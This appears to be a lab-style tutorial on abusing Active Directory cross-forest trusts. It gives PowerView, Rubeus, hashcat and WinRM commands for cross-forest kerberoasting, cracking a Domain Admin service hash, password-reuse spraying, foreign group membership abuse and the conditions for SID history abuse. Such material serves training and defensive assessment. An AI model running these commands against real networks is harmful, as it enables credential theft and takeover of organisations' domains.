# Attacking Domain Trusts: Cross-Forest Trust Abuse from Windows

Cross-forest trust abuse relies on the same Kerberos attack primitives used within a single domain, but the attack surface expands significantly when bidirectional trusts exist. The key difference is that Kerberos authentication can flow across forest boundaries, meaning SPN-based attacks and group membership misconfigurations become exploitable across separate forests. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

***

## Cross-Forest Kerberoasting

When you hold a position in a domain with an inbound or bidirectional trust to another forest, you can query SPNs in the target domain and request TGS tickets for those accounts. The tickets are encrypted with the service account's password hash and can be cracked offline.

Enumerate SPN accounts in the trusted forest:

```powershell
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
```

Before attacking, confirm the privilege level of any account you find:

```powershell
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof
# memberof: CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
```

Finding a service account that is a Domain Admin in the target forest makes this a high-value target. Use Rubeus with the `/domain` flag to target the external domain directly:

```powershell
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```

The `/nowrap` flag prevents the hash from being line-wrapped, making it ready to feed directly into Hashcat. Crack with mode `13100` for RC4 hashes:

```bash
hashcat -m 13100 mssqlsvc_hash /usr/share/wordlists/rockyou.txt
```

A successful crack gives full Domain Admin access to `FREIGHTLOGISTICS.LOCAL` from a position in `INLANEFREIGHT.LOCAL`, expanding your footprint across both forests. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

***

## Admin Password Re-Use Across Forests

Bidirectional forest trusts that are managed by the same administrative team frequently suffer from password reuse between domains. If you obtain the cleartext password or NT hash for a privileged account in Domain A, it is worth checking whether an account with a similar name in Domain B uses the same password. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

Common patterns to look for:

- Same account name in both domains (`administrator`)
- Variations on a naming scheme (`adm_bob.smith` in Domain A, `bsmith_admin` in Domain B)
- Shared service account passwords across forests

This requires minimal tooling and no exploit code. A simple CrackMapExec pass-the-hash or password spray across the trusted domain's DC will confirm reuse quickly.

***

## Foreign Group Membership Abuse

Only Domain Local Groups can contain security principals from outside the forest. When administrators add accounts from a trusted forest to high-privilege groups like the built-in `Administrators` group, they create a direct trust-based access path. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

Enumerate foreign group members using PowerView:

```powershell
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
```

Example output:

```
GroupName               : Administrators
MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
```

The `MemberName` field returns a SID when the account is from a foreign domain. Resolve it:

```powershell
Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
# INLANEFREIGHT\administrator
```

In this case, the built-in Administrator from `INLANEFREIGHT.LOCAL` is a member of the `Administrators` group in `FREIGHTLOGISTICS.LOCAL`. Once you control the INLANEFREIGHT domain, authenticate directly to the foreign DC over WinRM:

```powershell
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```

```
[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\> whoami
inlanefreight\administrator
```

Full administrative access to the second forest's DC is established without any additional exploitation. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

***

## SID History Abuse Across Forests

SID history abuse across forests follows the same concept as intra-forest ExtraSids attacks, but requires SID filtering to be disabled on the forest trust, which is not the default for external or forest trusts. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

If SID filtering is disabled and a user is migrated from Forest A to Forest B, their original SID remains in the `sidHistory` attribute. When they authenticate across the trust, that SID is included in their token. If the original SID carries administrative privileges in Forest A, the user retains those rights when accessing resources there, even while being a standard user in Forest B.

The conditions required for this to be exploitable:

- A bidirectional forest trust exists between the two forests
- SID filtering is disabled on the trust (`SIDFilteringQuarantined: False` in `Get-ADTrust` output)
- A user in Forest B has a SID from a privileged account in Forest A in their `sidHistory`

| Condition | How to Check |
|-----------|-------------|
| Trust direction | `Get-ADTrust -Filter *` or `Get-DomainTrust` |
| SID filtering disabled | `SIDFilteringQuarantined: False` in trust output |
| sidHistory populated | `Get-DomainUser -Identity <user> -Domain <domain> \| select sidhistory` |

This vector is particularly relevant in environments where companies have been acquired and user accounts were migrated rather than recreated from scratch. The migration tooling often populates `sidHistory` by design, and SID filtering is sometimes deliberately disabled to allow continued resource access during a transition period, then never re-enabled. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)
